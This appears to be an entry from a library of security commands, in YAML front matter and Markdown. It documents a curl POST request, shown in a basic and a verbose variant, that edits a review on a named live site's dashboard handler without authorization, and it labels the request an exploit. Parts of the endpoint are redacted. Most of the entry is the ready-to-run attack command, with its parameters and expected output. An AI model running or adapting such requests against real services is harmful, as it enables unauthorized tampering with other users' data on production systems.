---
data: >-
  curl -X POST -b "cookies.txt" -d
  "action=█████&review_id=31268525&review=Privilege+Escalation"
  https://www.zomato.com/██████████dashboard_handler.php
tags:
  - http-post
  - exploit
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:28.815Z'
id: c55dc8d0-ab2c-44f8-8936-f8569f65e243
verified: false
validated: true
submitted: true
---
# curl-zomato-review-edit

## Command

```bash
curl -X POST -b "cookies.txt" -d "action=█████&review_id=31268525&review=Privilege+Escalation" https://www.zomato.com/██████████dashboard_handler.php
```

## Description

This command sends a POST request to Zomato's review dashboard handler to exploit a privilege escalation vulnerability by editing a review without authorization. Use it when testing broken access controls in web applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-b "cookies.txt"` | Loads authentication cookies from file for session | Yes |
| `-d "..."` | Form data payload with action, review_id, and review parameters | Yes |
| URL | Target endpoint for the handler | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -b "cookies.txt" -d "action=█████&review_id=31268525&review=Privilege+Escalation" https://www.zomato.com/██████████dashboard_handler.php
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST -b "cookies.txt" -d "action=█████&review_id=31268525&review=Privilege+Escalation" https://www.zomato.com/██████████dashboard_handler.php
```

## Expected Output

A successful response (HTTP 200) with no authorization error, possibly empty body or confirmation JSON. Failure appears as 403 or error message if checks are in place.

## Related

- [[Related Procedure: Exploit-Zomato-Review-Edit-via-POST-Request]]
